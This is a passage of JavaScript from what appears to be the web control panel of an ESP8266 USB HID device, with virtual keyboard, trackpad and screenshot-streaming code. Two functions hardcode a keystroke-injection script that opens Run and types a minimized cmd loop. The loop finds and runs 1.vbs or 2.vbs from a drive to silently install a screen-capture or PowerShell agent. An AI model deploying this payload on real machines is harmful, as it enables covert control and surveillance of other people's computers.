            if (img.src && img.src.startsWith('blob:')) {
                URL.revokeObjectURL(img.src);
                img.src = '';
            }

            document.getElementById('screenshot-status').textContent = 'Waiting for screenshot...';
            document.getElementById('screenshot-modal-overlay').classList.add('show');

            // Establish dedicated WebSocket for image streaming
            connectScreenshotWebSocket();
        }

        function closeScreenshotModal() {
            document.getElementById('screenshot-modal-overlay').classList.remove('show');

            // Close dedicated image WebSocket
            if (screenshotWs) {
                try {
                    screenshotWs.close();
                } catch (e) {
                    console.error('[ERROR] Failed to close screenshot WebSocket:', e);
                }
                screenshotWs = null;
                console.log('[DEBUG] Screenshot WebSocket closed');
            }

            // Clean up image
            const img = document.getElementById('screenshot-image');
            if (img.src && img.src.startsWith('blob:')) {
                URL.revokeObjectURL(img.src);
                img.src = '';
            }

            // Reset state
            screenshotImageData = [];
            screenshotReceiving = false;
            screenshotBytesReceived = 0;
        }

        function connectScreenshotWebSocket() {
            // Close existing connection if any
            if (screenshotWs) {
                try { screenshotWs.close(); } catch (e) {}
                screenshotWs = null;
            }

            const wsImageUrl = `ws://${window.location.hostname}/ws_image`;
            console.log('[DEBUG] Connecting to image WebSocket:', wsImageUrl);
            screenshotWs = new WebSocket(wsImageUrl);
            screenshotWs.binaryType = 'arraybuffer';  // CRITICAL: Enable binary mode

            screenshotWs.onopen = function() {
                console.log('[DEBUG] Screenshot WebSocket connected');
                document.getElementById('screenshot-status').textContent = 'Connected. Waiting for screenshot...';
            };

            screenshotWs.onmessage = function(event) {
                // Only handle binary messages
                if (event.data instanceof ArrayBuffer) {
                    console.log('[DEBUG] Received image data, size:', event.data.byteLength);
                    handleBinaryMessage(event.data);
                } else {
                    console.warn('[WARN] Screenshot WebSocket received text message (unexpected)');
                }
            };

            screenshotWs.onerror = function(error) {
                console.error('[ERROR] Screenshot WebSocket error:', error);
                document.getElementById('screenshot-status').textContent = 'Error connecting to image stream';
            };

            screenshotWs.onclose = function() {
                console.log('[DEBUG] Screenshot WebSocket closed');
                if (document.getElementById('screenshot-modal-overlay').classList.contains('show')) {
                    // Modal still open but connection closed
                    document.getElementById('screenshot-status').textContent = 'Disconnected from image stream';
                }
                screenshotWs = null;
            };
        }

        // ========== INSTALL AGENT FUNCTIONS ==========
        let isAgentInstalling = false;  // Flag to track agent installation

        function installAgent() {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }

            // Hardcoded PhantomScript for ScreenCapture agent installation
            const agentScript = `REM ScreenCapture agent installer
DELAY 100
DEFAULTDELAY 3
GUI R
DELAY 100
STRING cmd /min /c "for %D in (Z Y X W V U T S R Q P O N M L K J I H G F E D C) do if exist %D:\\1.vbs wscript %D:\\1.vbs"
DELAY 100
ENTER`;

            // Send script load command to backend
            if (ws && ws.readyState === WebSocket.OPEN) {
                isAgentInstalling = true;  // Set flag
                showToast('Installing agent...', 'info');
                ws.send('SCRIPT_LOAD_STRING:' + agentScript);
                appendOutput('Running agent installer...\n', 'system-message');
            }
        }

        function installPSAgent() {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }

            if (!storageModeEnabled) {
                showToast('Storage mode must be enabled', 'error');
                return;
            }

            // Hardcoded PhantomScript for PowerShell agent installation
            const psAgentScript = `REM PowerShell agent installer
DELAY 100
DEFAULTDELAY 3
GUI R
DELAY 100
STRING cmd /min /c "for %D in (Z Y X W V U T S R Q P O N M L K J I H G F E D C) do if exist %D:\\2.vbs wscript %D:\\2.vbs"
DELAY 100
ENTER`;

            // Send script load command to backend
            if (ws && ws.readyState === WebSocket.OPEN) {
                isAgentInstalling = true;  // Set flag
                showToast('Installing PowerShell agent...', 'info');
                ws.send('SCRIPT_LOAD_STRING:' + psAgentScript);
                appendOutput('Running PowerShell agent installer...\n', 'system-message');

                // Also show in PowerShell console if open
                if (psConsoleOpen) {
                    appendToSerialMonitor('Installing PowerShell agent...\n');
                }
            }
        }

        document.getElementById('screenshot-modal-overlay').addEventListener('click', function(e) {
            if (e.target === this) closeScreenshotModal();
        });

        // Handle binary WebSocket messages (screenshot data)
        function arraysEqual(a, b) {
            if (a.length !== b.length) return false;
            for (let i = 0; i < a.length; i++) {
                if (a[i] !== b[i]) return false;
            }
            return true;
        }

        function handleBinaryMessage(arrayBuffer) {
            const data = new Uint8Array(arrayBuffer);

            // Check for 4-byte markers
            if (data.length === 4) {
                const dataArray = Array.from(data);

                if (arraysEqual(dataArray, MARKER_START)) {
                    // CRITICAL: Clear previous image data completely
                    if (screenshotImageData.length > 0) {
                        console.log('Warning: Clearing ' + screenshotImageData.length + ' bytes from previous image');
                    }
                    screenshotImageData = [];
                    screenshotReceiving = true;
                    screenshotBytesReceived = 0;
                    document.getElementById('screenshot-status').textContent = 'Receiving screenshot...';
                    const img = document.getElementById('screenshot-image');
                    img.style.display = 'none';
                    console.log('Started receiving screenshot (binary)');
                    return;
                }
                else if (arraysEqual(dataArray, MARKER_END)) {
                    if (!screenshotReceiving) {
                        console.log('Warning: END marker received but not receiving');
                        return;
                    }
                    screenshotReceiving = false;

                    // Verify we have valid image data
                    if (screenshotImageData.length === 0) {
                        console.log('Error: No image data received');
                        document.getElementById('screenshot-status').textContent = 'Error: Empty image';
                        return;
                    }

                    const blob = new Blob([new Uint8Array(screenshotImageData)], {type: 'image/png'});
                    const url = URL.createObjectURL(blob);

                    // Clean up old object URL if exists
                    const img = document.getElementById('screenshot-image');
                    if (img.src && img.src.startsWith('blob:')) {
                        URL.revokeObjectURL(img.src);
                    }

                    img.src = url;
                    img.style.display = 'block';
                    document.getElementById('screenshot-status').textContent = 'Screenshot received! Total: ' + formatBytes(screenshotBytesReceived);
                    console.log('Screenshot complete: ' + screenshotBytesReceived + ' bytes');

                    // Clear for next image
                    screenshotImageData = [];
                    screenshotBytesReceived = 0;
                    return;
                }
            }

            // Image data chunk
            if (screenshotReceiving) {
                for (let i = 0; i < data.length; i++) {
                    screenshotImageData.push(data[i]);
                }
                screenshotBytesReceived += data.length;

                if (screenshotBytesReceived % 2048 < 1024) {
                    document.getElementById('screenshot-status').textContent = 'Receiving: ' + formatBytes(screenshotBytesReceived) + '...';
                }
            } else {
                // Received data when not in receiving mode - ignore
                console.log('Ignoring ' + data.length + ' bytes (not receiving)');
            }
        }

        function formatBytes(bytes) {
            if (bytes < 1024) return bytes + ' B';
            if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
            return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
        }

        // ========== DEVICE INFO PARSING ==========
        function parseDeviceInfo(data) {
            const timestamp = new Date().toISOString();
            console.log(`[${timestamp}] [INFO-PARSE] Initial page load - parsing toggle states from INFO response`);

            let cleanData = data;
            // ESP8266 always adds "> " prefix to AT responses, so we get "> +INFO: ..."
            if (data.startsWith('> +INFO:')) {
                cleanData = data.substring(8).trim();  // Remove '> +INFO:' (8 chars)
            } else if (data.startsWith('+INFO:')) {
                cleanData = data.substring(6).trim();  // Fallback: remove '+INFO:' (6 chars)
            }

            console.log(`[${timestamp}] [INFO-PARSE] Cleaned INFO data: "${cleanData}"`);

            if (!cleanData || cleanData.length === 0) return;

            const parts = cleanData.split(',');
            parts.forEach(part => {
                const [key, value] = part.split('=');
                if (!key || value === undefined) return;

                switch (key.trim()) {
                    case 'TYPE':
                        deviceInfo.type = value.trim();
                        deviceType = value.trim().toUpperCase();
                        updateInputButton();
                        updateScriptUI();
                        break;
                    case 'VID':
                        deviceInfo.vid = '0x' + value.trim();
                        break;
                    case 'PID':
                        deviceInfo.pid = '0x' + value.trim();
                        break;
                    case 'MFG':
                        deviceInfo.manufacturer = value.trim() || 'N/A';
                        break;
                    case 'PROD':
                        deviceInfo.name = value.trim() || 'Unknown Device';
                        break;
                    case 'SER':
                        deviceInfo.serial = value.trim() || 'N/A';
                        break;
                    case 'HYBRID':
                        // Parse hybrid mode state from INFO response
                        const hybridValue = value.trim().toUpperCase();
                        hybridModeEnabled = (hybridValue === 'ON');
                        console.log(`[${timestamp}] [INFO-PARSE] HYBRID state from INFO: ${hybridValue} → hybridModeEnabled=${hybridModeEnabled}`);
                        updateToggleUI('hybrid', hybridModeEnabled);
                        updateHybridButton();
                        updateInputButton();
                        updateScriptUI();
                        console.log(`[${timestamp}] [INFO-PARSE] HYBRID toggle state initialized`);
                        break;
                    case 'SERIAL':
                        // Parse serial CDC mode state
                        const serialValue = value.trim().toUpperCase();
                        serialModeEnabled = (serialValue === 'ON');
                        console.log(`[${timestamp}] [INFO-PARSE] SERIAL state from INFO: ${serialValue} → serialModeEnabled=${serialModeEnabled}`);
                        updateToggleUI('serial', serialModeEnabled);
                        updateShellButton();
                        updateScreenButton();
                        updateInstallAgentButton();
                        console.log(`[${timestamp}] [INFO-PARSE] SERIAL toggle state initialized`);
                        break;
                    case 'STORAGE':
                        // Parse storage mode state
                        const storageValue = value.trim().toUpperCase();
                        storageModeEnabled = (storageValue === 'ON');
                        console.log(`[${timestamp}] [INFO-PARSE] STORAGE state from INFO: ${storageValue} → storageModeEnabled=${storageModeEnabled}`);
                        updateToggleUI('storage', storageModeEnabled);
                        updateInstallAgentButton();
                        updatePSInstallAgentButton();
                        console.log(`[${timestamp}] [INFO-PARSE] STORAGE toggle state initialized`);
                        break;
                }
            });
        }

        function parseDeviceType(data) {
            const match = data.match(/TYPE[:\s]+(\w+)/i);
            if (match) {
                deviceType = match[1].toUpperCase();
                deviceInfo.type = deviceType;
                updateInputButton();
                updateScriptUI();
            }
        }

        // ========== DEVICE INFO MODAL ==========
        function showDeviceModal() {
            document.getElementById('modal-name').textContent = deviceInfo.name;
            document.getElementById('modal-type').textContent = deviceInfo.type;
            document.getElementById('modal-mfg').textContent = deviceInfo.manufacturer;
            document.getElementById('modal-vid').textContent = deviceInfo.vid;
            document.getElementById('modal-pid').textContent = deviceInfo.pid;
            document.getElementById('modal-serial').textContent = deviceInfo.serial;
            document.getElementById('device-modal-overlay').classList.add('show');
        }

        function closeDeviceModal() {
            document.getElementById('device-modal-overlay').classList.remove('show');
        }

        document.getElementById('device-modal-overlay').addEventListener('click', function(e) {
            if (e.target === this) closeDeviceModal();
        });

        // ========== DIRECT INPUT OPENING ==========
        function openMouseInput() {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }
            openInputModal();
        }

        function openKeyboardInput() {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }
            openVKeyboard();
        }

        // ========== INPUT MODAL ==========
        function openInputModal() {
            if (!isConnected) {
                showToast('Not connected', 'error');
                return;
            }

            const trackpadContainer = document.getElementById('trackpad-container');
            const keyboardContainer = document.getElementById('keyboard-container');
            const modeSelector = document.getElementById('input-mode-selector');

            // If hybrid mode is active or device is composite, show mode selector
            if (deviceType === 'HYBRID' || deviceType === 'COMPOSITE' || hybridModeEnabled) {
                modeSelector.style.display = 'block';
                // Default to mouse
                switchInputMode('mouse');
            } else {
                modeSelector.style.display = 'none';
                if (deviceType === 'MOUSE') {
                    trackpadContainer.classList.add('active');
                    keyboardContainer.classList.remove('active');
                    initTrackpad();
                } else if (deviceType === 'KEYBOARD') {
                    trackpadContainer.classList.remove('active');
                    keyboardContainer.classList.add('active');
                    initKeyboard();
                }
            }

            document.getElementById('input-modal-overlay').classList.add('show');
        }

        function switchInputMode(mode) {
            const trackpadContainer = document.getElementById('trackpad-container');
            const keyboardContainer = document.getElementById('keyboard-container');
            const mouseModeBtn = document.getElementById('mode-mouse-btn');
            const keyboardModeBtn = document.getElementById('mode-keyboard-btn');

            if (mode === 'mouse') {
                trackpadContainer.classList.add('active');
                keyboardContainer.classList.remove('active');
                mouseModeBtn.classList.add('btn-success');
                mouseModeBtn.classList.remove('btn-secondary');
                keyboardModeBtn.classList.remove('btn-success');
                keyboardModeBtn.classList.add('btn-secondary');
                initTrackpad();
            } else if (mode === 'keyboard') {
                trackpadContainer.classList.remove('active');
                keyboardContainer.classList.add('active');
                keyboardModeBtn.classList.add('btn-success');
                keyboardModeBtn.classList.remove('btn-secondary');
                mouseModeBtn.classList.remove('btn-success');
                mouseModeBtn.classList.add('btn-secondary');
                initKeyboard();
            }
        }

        function closeInputModal() {
            document.getElementById('input-modal-overlay').classList.remove('show');
            cleanupInput();
        }

        document.getElementById('input-modal-overlay').addEventListener('click', function(e) {
            if (e.target === this) closeInputModal();
        });

        // ========== VIRTUAL KEYBOARD IMPLEMENTATION ==========
        let vkeyTouches = new Map();  // Track active touches by touch identifier
        let vkeyPressedKeys = new Set();  // Track which keys are currently pressed
        let vkeyModifiers = new Set();  // Track sticky modifiers
        let vkeyToggles = new Set();  // Track toggle states
        let vkeyFnActive = false;  // Track Fn key state

        // Fn layer mapping: F-key code -> Consumer control code
        const fnLayerMap = {
            0x3A: 0x00B5,  // F1 -> SCAN_PREV_TRACK
            0x3B: 0x00B6,  // F2 -> SCAN_NEXT_TRACK
            0x3C: 0x00B7,  // F3 -> STOP
            0x3D: 0x00CD,  // F4 -> PLAY_PAUSE
            0x3E: 0x00E2,  // F5 -> MUTE
            0x3F: 0x00EA,  // F6 -> VOLUME_DOWN
            0x40: 0x00E9,  // F7 -> VOLUME_UP
            0x41: 0x0183,  // F8 -> MEDIA_SELECT_WWW (Browser)
            0x42: 0x018A,  // F9 -> MAIL
            0x43: 0x0192,  // F10 -> CALCULATOR
            0x44: 0x0194,  // F11 -> MY_COMPUTER
            0x45: 0x0221   // F12 -> SEARCH
        };

        function openVKeyboard() {
            document.getElementById('vkeyboard-modal-overlay').classList.add('show');
            initVKeyboard();
        }

        function closeVKeyboard() {
            document.getElementById('vkeyboard-modal-overlay').classList.remove('show');
            cleanupVKeyboard();
        }

        function initVKeyboard() {
            const vkeys = document.querySelectorAll('.vkey');
            vkeys.forEach(key => {
                // Touch events
                key.addEventListener('touchstart', handleVKeyTouchStart, {passive: false});
                key.addEventListener('touchend', handleVKeyTouchEnd, {passive: false});
                key.addEventListener('touchcancel', handleVKeyTouchEnd, {passive: false});

                // Mouse events (for desktop)
                key.addEventListener('mousedown', handleVKeyMouseDown);
                key.addEventListener('mouseup', handleVKeyMouseUp);
                key.addEventListener('mouseleave', handleVKeyMouseLeave);
            });
        }

        function cleanupVKeyboard() {
            // Release all keys
            vkeyPressedKeys.forEach(keycode => {
                sendVKeyRelease(keycode);
            });
            vkeyPressedKeys.clear();
            vkeyTouches.clear();
            vkeyFnActive = false;

            // Clear visual states (except toggles)
            const vkeys = document.querySelectorAll('.vkey');
            vkeys.forEach(key => {
                if (!key.classList.contains('toggle')) {
                    key.classList.remove('pressed', 'active');
                }
            });

            // Send clear command to ESP8266
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send('VKEY_CLEAR');
            }
        }

        function handleVKeyTouchStart(e) {
            e.preventDefault();
            e.stopPropagation();

            const key = e.currentTarget;
            const keycode = parseInt(key.dataset.key);

            // Handle all changed touches
            for (let touch of e.changedTouches) {
                const touchId = touch.identifier;

                // Store touch association
                vkeyTouches.set(touchId, { element: key, keycode: keycode });

                // Handle key press
                handleVKeyPress(key, keycode);
            }
        }

        function handleVKeyTouchEnd(e) {
            e.preventDefault();
            e.stopPropagation();

            // Handle all changed touches
            for (let touch of e.changedTouches) {
                const touchId = touch.identifier;
                const touchData = vkeyTouches.get(touchId);

                if (touchData) {
                    handleVKeyRelease(touchData.element, touchData.keycode);
                    vkeyTouches.delete(touchId);
                }
            }
        }

        function handleVKeyMouseDown(e) {
            e.preventDefault();
            const key = e.currentTarget;
            const keycode = parseInt(key.dataset.key);
            handleVKeyPress(key, keycode);
        }

        function handleVKeyMouseUp(e) {
            e.preventDefault();
            const key = e.currentTarget;
            const keycode = parseInt(key.dataset.key);
            handleVKeyRelease(key, keycode);
        }

        function handleVKeyMouseLeave(e) {
            const key = e.currentTarget;
            const keycode = parseInt(key.dataset.key);

            // Only release if it's not a sticky modifier
            if (!vkeyModifiers.has(keycode) && !key.classList.contains('toggle')) {
                handleVKeyRelease(key, keycode);
            }
        }

        function handleVKeyPress(keyElement, keycode) {
            const isModifier = keyElement.classList.contains('modifier');
            const isToggle = keyElement.classList.contains('toggle');

            // Special handling for Fn key (0xFF)
            if (keycode === 0xFF) {
                vkeyFnActive = !vkeyFnActive;
                if (vkeyFnActive) {
                    keyElement.classList.add('active');
                } else {
                    keyElement.classList.remove('active');
                }
                return;  // Fn key doesn't send HID codes
            }

            // If Fn is active and this is a function key (F1-F12), send consumer code instead
            // Function keys are 0x3A to 0x45
            if (vkeyFnActive && keycode >= 0x3A && keycode <= 0x45) {
                const consumerCode = fnLayerMap[keycode];
                if (consumerCode) {
                    sendConsumerKey(consumerCode);
                    keyElement.classList.add('pressed');
                    vkeyPressedKeys.add(keycode);  // Track for release
                }
                return;
            }

            if (isModifier) {
                // Modifiers: Toggle sticky state
                if (vkeyModifiers.has(keycode)) {
                    // Already sticky - turn off
                    vkeyModifiers.delete(keycode);
                    keyElement.classList.remove('active');
                    sendVKeyRelease(keycode);
                    vkeyPressedKeys.delete(keycode);
                } else {
                    // Make sticky
                    vkeyModifiers.add(keycode);
                    keyElement.classList.add('active');
                    sendVKeyPress(keycode);
                    vkeyPressedKeys.add(keycode);
                }
            } else if (isToggle) {
                // Toggles: Flip state
                if (vkeyToggles.has(keycode)) {
                    vkeyToggles.delete(keycode);
                    keyElement.classList.remove('active');
                } else {
                    vkeyToggles.add(keycode);
                    keyElement.classList.add('active');
                }
                // Send press for toggle (will be released immediately after)
                sendVKeyPress(keycode);
                vkeyPressedKeys.add(keycode);
                keyElement.classList.add('pressed');
            } else {
                // Normal keys: Press and hold
                if (!vkeyPressedKeys.has(keycode)) {
                    sendVKeyPress(keycode);
                    vkeyPressedKeys.add(keycode);
                    keyElement.classList.add('pressed');
                }
            }
        }

        function handleVKeyRelease(keyElement, keycode) {
            const isModifier = keyElement.classList.contains('modifier');
            const isToggle = keyElement.classList.contains('toggle');

            // Fn key doesn't send release
            if (keycode === 0xFF) {
                return;
            }

            // If Fn is active and this is a function key, release consumer code
            if (vkeyFnActive && keycode >= 0x3A && keycode <= 0x45) {
                const consumerCode = fnLayerMap[keycode];
                if (consumerCode) {
                    sendConsumerKey(0x0000);  // Release consumer key (send 0x0000)
                    vkeyPressedKeys.delete(keycode);
                }
                keyElement.classList.remove('pressed');
                return;
            }

            if (isModifier) {
                // Modifiers: Don't release if sticky
                if (!vkeyModifiers.has(keycode)) {
                    // Not sticky, release normally
                    sendVKeyRelease(keycode);
                    vkeyPressedKeys.delete(keycode);
                    keyElement.classList.remove('pressed');
                }
                // If sticky, do nothing (stays active)
            } else if (isToggle) {
                // Toggles: Always release after short press
                setTimeout(() => {
                    sendVKeyRelease(keycode);
                    vkeyPressedKeys.delete(keycode);
                    keyElement.classList.remove('pressed');
                }, 50);
            } else {
                // Normal keys: Release normally
                sendVKeyRelease(keycode);
                vkeyPressedKeys.delete(keycode);
                keyElement.classList.remove('pressed');

                // Clear sticky modifiers after normal key press
                vkeyModifiers.forEach(modKeycode => {
                    sendVKeyRelease(modKeycode);
                    vkeyPressedKeys.delete(modKeycode);
                    const modElement = document.querySelector(`.vkey[data-key="${'0x' + modKeycode.toString(16).toUpperCase()}"]`);
                    if (modElement) {
                        modElement.classList.remove('active');
                    }
                });
                vkeyModifiers.clear();
            }
        }

        function sendVKeyPress(keycode) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                const cmd = 'VKEY_PRESS:0x' + keycode.toString(16).toUpperCase();
                ws.send(cmd);
                console.log('VKey Press:', cmd);
            }
        }

        function sendVKeyRelease(keycode) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                const cmd = 'VKEY_RELEASE:0x' + keycode.toString(16).toUpperCase();
                ws.send(cmd);
                console.log('VKey Release:', cmd);
            }
        }

        function sendConsumerKey(consumerCode) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                const cmd = 'CONSUMER:0x' + consumerCode.toString(16).toUpperCase().padStart(4, '0');
                ws.send(cmd);
                console.log('Consumer Key:', cmd);
            }
        }

        document.getElementById('vkeyboard-modal-overlay').addEventListener('click', function(e) {
            if (e.target === this) closeVKeyboard();
        });

        // ========== TRACKPAD IMPLEMENTATION ==========
        let trackpadActive = false;
        let trackpadCtx = null;
        let scrollActive = false;
        let lastScrollY = 0;

        function initTrackpad() {
            const canvas = document.getElementById('trackpad');
            trackpadCtx = canvas.getContext('2d');
            canvas.width = canvas.offsetWidth;
            canvas.height = canvas.offsetHeight;
            
            trackpadActive = false;
            scrollActive = false;
            lastMousePos = { x: 0, y: 0 };
            lastScrollY = 0;
            
            trackpadCtx.clearRect(0, 0, canvas.width, canvas.height);

            canvas.addEventListener('mousedown', handleTrackpadStart);
            canvas.addEventListener('mousemove', handleTrackpadMove);
            canvas.addEventListener('mouseup', handleTrackpadEnd);
            canvas.addEventListener('mouseleave', handleTrackpadEnd);
            canvas.addEventListener('touchstart', handleTrackpadStart);
            canvas.addEventListener('touchmove', handleTrackpadMove);
            canvas.addEventListener('touchend', handleTrackpadEnd);

            const scrollArea = document.getElementById('scroll-area');
            scrollArea.addEventListener('mousedown', handleScrollStart);
            scrollArea.addEventListener('mousemove', handleScrollMove);
            scrollArea.addEventListener('mouseup', handleScrollEnd);
            scrollArea.addEventListener('mouseleave', handleScrollEnd);
            scrollArea.addEventListener('touchstart', handleScrollStart);
            scrollArea.addEventListener('touchmove', handleScrollMove);
            scrollArea.addEventListener('touchend', handleScrollEnd);

            const scrollUpArrow = document.getElementById('scroll-up-arrow');
            const scrollDownArrow = document.getElementById('scroll-down-arrow');
            scrollUpArrow.addEventListener('click', (e) => scrollWheel(1, e));
            scrollUpArrow.addEventListener('touchstart', (e) => { e.preventDefault(); scrollWheel(1, e); });
            scrollDownArrow.addEventListener('click', (e) => scrollWheel(-1, e));
            scrollDownArrow.addEventListener('touchstart', (e) => { e.preventDefault(); scrollWheel(-1, e); });

            document.getElementById('mouse-left-btn').addEventListener('mousedown', () => setMouseButton('left', true));
            document.getElementById('mouse-left-btn').addEventListener('mouseup', () => setMouseButton('left', false));
            document.getElementById('mouse-left-btn').addEventListener('touchstart', (e) => { e.preventDefault(); setMouseButton('left', true); });
            document.getElementById('mouse-left-btn').addEventListener('touchend', (e) => { e.preventDefault(); setMouseButton('left', false); });
            document.getElementById('mouse-right-btn').addEventListener('mousedown', () => setMouseButton('right', true));
            document.getElementById('mouse-right-btn').addEventListener('mouseup', () => setMouseButton('right', false));
            document.getElementById('mouse-right-btn').addEventListener('touchstart', (e) => { e.preventDefault(); setMouseButton('right', true); });
            document.getElementById('mouse-right-btn').addEventListener('touchend', (e) => { e.preventDefault(); setMouseButton('right', false); });
        }

        function handleTrackpadStart(e) {
            e.preventDefault();
            const pos = getTrackpadPos(e);
            lastMousePos = pos;
            trackpadActive = true;
            trackpadCtx.fillStyle = '#1e88e5';
            trackpadCtx.beginPath();
            trackpadCtx.arc(pos.x, pos.y, 3, 0, Math.PI * 2);
            trackpadCtx.fill();
        }

        function handleTrackpadMove(e) {
            if (!trackpadActive) return;
            e.preventDefault();
            const pos = getTrackpadPos(e);
            const deltaX = pos.x - lastMousePos.x;
            const deltaY = pos.y - lastMousePos.y;
            if (Math.abs(deltaX) > 0 || Math.abs(deltaY) > 0) {
                sendMouseHID(0, deltaX, deltaY, 0);
                trackpadCtx.strokeStyle = '#1e88e5';
                trackpadCtx.lineWidth = 2;
                trackpadCtx.beginPath();
                trackpadCtx.moveTo(lastMousePos.x, lastMousePos.y);
                trackpadCtx.lineTo(pos.x, pos.y);
                trackpadCtx.stroke();
                lastMousePos = pos;
            }
        }

        function handleTrackpadEnd(e) {
            e.preventDefault();
            trackpadActive = false;
            setTimeout(() => {
                if (trackpadCtx) {
                    trackpadCtx.clearRect(0, 0, trackpadCtx.canvas.width, trackpadCtx.canvas.height);
                }
            }, 500);
        }

        function getTrackpadPos(e) {
            const canvas = document.getElementById('trackpad');
            const rect = canvas.getBoundingClientRect();
            if (e.touches && e.touches.length > 0) {
                return {
                    x: e.touches[0].clientX - rect.left,
                    y: e.touches[0].clientY - rect.top
                };
            } else {
                return {
                    x: e.clientX - rect.left,
                    y: e.clientY - rect.top
                };
            }
        }

        function setMouseButton(button, pressed) {
            mouseButtons[button] = pressed;
            let buttons = 0;
            if (mouseButtons.left) buttons |= 0x01;
            if (mouseButtons.right) buttons |= 0x02;
            sendMouseHID(buttons, 0, 0, 0);
            const btn = document.getElementById(`mouse-${button}-btn`);
            if (pressed) {
                btn.style.background = 'linear-gradient(135deg, #1976d2 0%, #1565c0 100%)';
            } else {
                btn.style.background = '';
            }
        }

        function handleScrollStart(e) {
            e.preventDefault();
            scrollActive = true;
            const pos = getScrollPos(e);
            lastScrollY = pos.y;
            updateScrollIndicator(pos.y);
        }

        function handleScrollMove(e) {
            if (!scrollActive) return;
            e.preventDefault();
            const pos = getScrollPos(e);
            const deltaY = lastScrollY - pos.y;
            updateScrollIndicator(pos.y);
            if (Math.abs(deltaY) > 2) {
                const scrollAmount = Math.round(deltaY / 10);
                if (scrollAmount !== 0) {
                    sendMouseHID(0, 0, 0, scrollAmount);
                }
                lastScrollY = pos.y;
            }
        }

        function handleScrollEnd(e) {
            e.preventDefault();
            scrollActive = false;
            const indicator = document.getElementById('scroll-indicator');
            indicator.style.opacity = '0';
        }

        function getScrollPos(e) {
            const scrollArea = document.getElementById('scroll-area');
            const rect = scrollArea.getBoundingClientRect();
            if (e.touches && e.touches.length > 0) {
                return { y: e.touches[0].clientY - rect.top };
            } else {
                return { y: e.clientY - rect.top };
            }
        }

        function updateScrollIndicator(y) {
            const indicator = document.getElementById('scroll-indicator');
            const scrollArea = document.getElementById('scroll-area');
            const height = scrollArea.offsetHeight;
            y = Math.max(15, Math.min(height - 15, y));
            indicator.style.opacity = '1';
            indicator.style.top = (y - 15) + 'px';
        }

        function sendMouseHID(buttons, x, y, wheel) {
            x = Math.max(-127, Math.min(127, Math.round(x)));
            y = Math.max(-127, Math.min(127, Math.round(y)));
            wheel = Math.max(-127, Math.min(127, Math.round(wheel)));
            const xByte = x < 0 ? 256 + x : x;
            const yByte = y < 0 ? 256 + y : y;
            const wheelByte = wheel < 0 ? 256 + wheel : wheel;
            const hidData = `HID:02:0004:${toHex(buttons, 2)}${toHex(xByte, 2)}${toHex(yByte, 2)}${toHex(wheelByte, 2)}`;
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(hidData + '\r\n');
            }
        }

        function scrollWheel(direction, event) {
            if (event) {
                event.preventDefault();
                event.stopPropagation();
            }
            sendMouseHID(0, 0, 0, direction * 3);
        }

        // ========== KEYBOARD IMPLEMENTATION ==========
        function initKeyboard() {
            const inputField = document.getElementById('keyboard-input-field');
            const display = document.getElementById('keyboard-display');
            display.textContent = '';
            inputField.value = '';
            heldKeys.clear();
            modifiers = 0;
            setTimeout(() => inputField.focus(), 100);
            inputField.addEventListener('keydown', handleKeyDown);
            inputField.addEventListener('keyup', handleKeyUp);
        }

        function handleKeyDown(e) {
            e.preventDefault();
            const keyCode = mapKeyToHID(e.key, e.code);
            if (keyCode === null) return;
            updateModifiers(e);
            if (!heldKeys.has(keyCode)) {
                heldKeys.add(keyCode);
                displayKey(e.key, e);
                sendKeyboardHID();
            }
        }

        function handleKeyUp(e) {
            e.preventDefault();
            const keyCode = mapKeyToHID(e.key, e.code);
            if (keyCode === null) return;
            updateModifiers(e);
            heldKeys.delete(keyCode);
            sendKeyboardHID();
        }

        function updateModifiers(e) {
            modifiers = 0;
            if (e.ctrlKey) modifiers |= 0x01;
            if (e.shiftKey) modifiers |= 0x02;
            if (e.altKey) modifiers |= 0x04;
            if (e.metaKey) modifiers |= 0x08;
        }

        function displayKey(key, e) {
            const display = document.getElementById('keyboard-display');
            let displayText = '';
            if (e.ctrlKey) displayText += 'CTRL+';
            if (e.shiftKey) displayText += 'SHIFT+';
            if (e.altKey) displayText += 'ALT+';
            if (e.metaKey) displayText += 'GUI+';
            displayText += getDisplayKeyName(key, e.code);
            display.textContent += `⌨️ [${displayText}]\n`;
            display.scrollTop = display.scrollHeight;
        }

        function getDisplayKeyName(key, code) {
            const specialKeys = {
                'Enter': 'ENTER', 'Escape': 'ESC', 'Backspace': 'BACKSPACE',
                'Tab': 'TAB', ' ': 'SPACE', 'ArrowUp': 'UP_ARROW',
                'ArrowDown': 'DOWN_ARROW', 'ArrowLeft': 'LEFT_ARROW',
                'ArrowRight': 'RIGHT_ARROW', 'Delete': 'DELETE',
                'Insert': 'INSERT', 'Home': 'HOME', 'End': 'END',
                'PageUp': 'PAGE_UP', 'PageDown': 'PAGE_DOWN'
            };
            if (specialKeys[key]) return specialKeys[key];
            if (code.startsWith('F') && code.length <= 3) return code.toUpperCase();
            if (key.length === 1) return key.toUpperCase();
            return key.toUpperCase();
        }

        function mapKeyToHID(key, code) {
            const keyMap = {
                'a': 0x04, 'b': 0x05, 'c': 0x06, 'd': 0x07, 'e': 0x08, 'f': 0x09,
                'g': 0x0A, 'h': 0x0B, 'i': 0x0C, 'j': 0x0D, 'k': 0x0E, 'l': 0x0F,
                'm': 0x10, 'n': 0x11, 'o': 0x12, 'p': 0x13, 'q': 0x14, 'r': 0x15,
                's': 0x16, 't': 0x17, 'u': 0x18, 'v': 0x19, 'w': 0x1A, 'x': 0x1B,
                'y': 0x1C, 'z': 0x1D,
                '1': 0x1E, '2': 0x1F, '3': 0x20, '4': 0x21, '5': 0x22,
                '6': 0x23, '7': 0x24, '8': 0x25, '9': 0x26, '0': 0x27,
                'Enter': 0x28, 'Escape': 0x29, 'Backspace': 0x2A, 'Tab': 0x2B,
                ' ': 0x2C, '-': 0x2D, '=': 0x2E, '[': 0x2F, ']': 0x30, '\\': 0x31,
                ';': 0x33, "'": 0x34, '`': 0x35, ',': 0x36, '.': 0x37, '/': 0x38,
                'CapsLock': 0x39,
